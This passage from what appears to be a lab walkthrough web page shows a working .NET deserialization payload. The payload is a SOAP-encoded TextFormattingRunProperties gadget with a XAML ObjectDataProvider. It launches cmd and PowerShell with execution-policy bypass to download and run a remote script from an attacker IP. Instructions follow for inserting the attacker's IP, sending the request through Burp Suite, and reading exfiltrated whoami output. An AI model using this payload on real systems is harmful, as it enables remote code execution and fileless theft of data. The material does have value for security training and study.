                   xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;
                   xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;
                   xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;
                   xmlns:clr=&quot;http://schemas.microsoft.com/soap/encoding/clr/1.0&quot;
                   SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;
  &lt;a1:TextFormattingRunProperties id=&quot;ref-1&quot;
                                  xmlns:a1=&quot;http://schemas.microsoft.com/clr/nsassem/Microsoft.VisualStudio.Text.Formatting/Microsoft.PowerShell.Editor%2C%20Version%3D3.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3D31bf3856ad364e35&quot;&gt;
    &lt;ForegroundBrush id=&quot;ref-3&quot;&gt;
      &amp;lt;ResourceDictionary
        xmlns=&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot;
        xmlns:x=&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot;
        xmlns:System=&quot;clr-namespace:System;assembly=mscorlib&quot;
        xmlns:Diag=&quot;clr-namespace:System.Diagnostics;assembly=system&quot;&amp;gt;
        &amp;lt;ObjectDataProvider x:Key=&quot;&quot; ObjectType=&quot;{x:Type Diag:Process}&quot; MethodName=&quot;Start&quot; &amp;gt;
          &amp;lt;ObjectDataProvider.MethodParameters&amp;gt;
            &amp;lt;System:String&amp;gt;cmd&amp;lt;/System:String&amp;gt;
            &amp;lt;System:String&amp;gt;&quot;/c powershell -exec Bypass -C \&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.10.27.2:445/payload.txt&#x27;)\&quot;&quot;&amp;lt;/System:String&amp;gt;
          &amp;lt;/ObjectDataProvider.MethodParameters&amp;gt;
        &amp;lt;/ObjectDataProvider&amp;gt;
      &amp;lt;/ResourceDictionary&amp;gt;
    &lt;/ForegroundBrush&gt;
  &lt;/a1:TextFormattingRunProperties&gt;
&lt;/SOAP-ENV:Envelope&gt;


</code></pre><blockquote id="85449d8e-4d82-46bf-8ed5-f037e4e44fba" class="">[Note] Make sure to place the IP address of your attacker machine in the above request.</blockquote><p id="34d61a66-d9ae-44d2-b04c-28c44ba6a524" class="">Send the above request from Burp Suite:</p><blockquote id="81b245bf-a004-4146-bad4-4765ed3e42a3" class="">We can see the output of the whoami command being transmitted in the HTTP GET parameter.</blockquote><blockquote id="4704c47e-ab8b-4ea6-836c-755db02cbe23" class="">This is because PowerShell fetched the remote resource and then immediately executed it using the IEX command. Note that we haven’t even touched the filesystem!</blockquote></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>